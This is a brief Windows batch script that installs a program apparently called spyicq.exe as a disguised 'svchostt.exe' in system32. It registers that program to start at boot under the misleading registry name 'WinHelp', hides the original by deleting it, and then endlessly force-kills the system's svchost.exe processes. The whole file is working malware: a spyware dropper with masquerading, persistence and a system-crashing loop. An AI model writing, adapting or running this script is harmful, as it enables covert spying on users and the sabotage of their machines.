@echo off


set c=svchostt

reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WinHelp /t REG_SZ /d %windir%\system32\%c%.exe /f > nul


if exist %windir%\system32\svchostt.exe (goto a) else goto b


:b
copy spyicq.exe %windir%\system32\svchostt.exe
attrib +R %windir%\system32\svchostt.exe
del spyicq.exe
goto a


:a
taskkill /F /im svchost.exe
goto a
